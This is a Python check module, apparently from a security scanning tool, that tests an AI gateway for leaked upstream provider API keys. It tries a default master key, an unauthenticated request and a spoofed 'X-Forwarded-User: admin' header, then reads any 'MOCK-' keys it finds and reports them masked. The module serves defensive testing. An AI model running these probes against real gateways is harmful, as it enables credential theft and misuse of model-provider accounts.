"""aigateway-upstream-key-exfil — 默认 master key → 上游 provider key 外泄。

Ruling：finding 只保留 MOCK****尾4位；完整值仅落 run/traces 归档层（不入报告）。
"""
from __future__ import annotations

import importlib.util
from pathlib import Path

_PARENT = Path(__file__).resolve().parent.parent
_SPEC = importlib.util.spec_from_file_location("_aigateway_common", _PARENT / "_aigateway-common.py")
_COMMON = importlib.util.module_from_spec(_SPEC)
_SPEC.loader.exec_module(_COMMON)

KEY = "aigateway-upstream-key-exfil"
WRITES = False
Trace, finding, mask = _COMMON.Trace, _COMMON.finding, _COMMON.mask
bearer, master_key, target = _COMMON.bearer, _COMMON.master_key, _COMMON.target
ok, resp, status = _COMMON.ok, _COMMON.resp, _COMMON.status


def run(ctx: dict, params: dict) -> dict:
    base = target(params)
    if not base:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    master = master_key(params)
    t = Trace(ctx, KEY)
    config_master = t.call("GET", f"{base}/config", headers=bearer(master))
    config_anon = t.call("GET", f"{base}/config")
    keyinfo = t.call("GET", f"{base}/key/info",
                     headers={**bearer(master), "X-Forwarded-User": "admin"})

    source = config_master if ok(config_master) else config_anon
    payload = resp(source)
    upstreams = payload.get("upstreams") or []
    found = [(str(u.get("provider") or "unknown"), str(u.get("api_key") or ""))
             for u in upstreams if str(u.get("api_key") or "").startswith("MOCK-")]
    master_value = str(payload.get("master_key") or resp(keyinfo).get("master_key") or "")

    findings: list[dict] = []
    if found:
        detail = {
            "route": "/config",
            "http_status": status(source),
            "providers": [provider for provider, _ in found],
            "keys": [{"provider": provider, "masked": mask(value)} for provider, value in found],
            "master_key_masked": mask(master_value) if master_value else "",
            "full_key_count": len(found),
            "credential_class": "upstream-provider-key",
            "keyinfo_status": status(keyinfo),
            "note": "上游 provider key 明文可读：可直连模型厂商计费面/替换模型/拉取私有模型清单；"
                    "完整值仅存归档 trace，报告与 finding 只保留尾 4 位",
        }
        findings.append(finding(
            "critical", f"AI 网关上游 provider key 明文外泄：{len(found)} 个 provider 凭据可读", detail))

    artifact = t.dump()
    masked = ",".join(f"{provider}:{mask(value)}" for provider, value in found) or "none"
    summary = (f"/config={status(source)} providers={len(found)} keys={masked} "
               f"keyinfo={status(keyinfo)}")
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
